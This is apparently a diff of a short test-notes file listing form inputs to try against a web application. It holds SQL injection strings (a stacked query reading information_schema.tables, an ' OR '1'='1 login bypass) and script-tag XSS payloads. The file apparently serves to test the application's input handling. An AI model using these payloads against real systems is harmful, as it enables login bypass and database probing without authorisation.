@@ -1,14 +1,16 @@
 
 Register:
-    username: '); SELECT * FROM information_schema.tables LIMIT 1; -- 
+    any value before password and then:
+    password: '); SELECT * FROM information_schema.tables LIMIT 1; -- 
 
 Login:
     username: bla ' OR '1' = '1
+    password: bls ' OR '1'='1
 
 add_customer:
     Address: 123street'); SELECT * FROM information_schema.tables LIMIT 1; -- 
 
 XSS:
     FirstName: <script>alert("XSS");</script>
-    LastName: <script>alert("XSS");</script>
-    Address: <script>alert("XSS");</script>
+    LastName: <script>alert("hack");</script>
+    Address: <script>alert("cyberrr");</script>
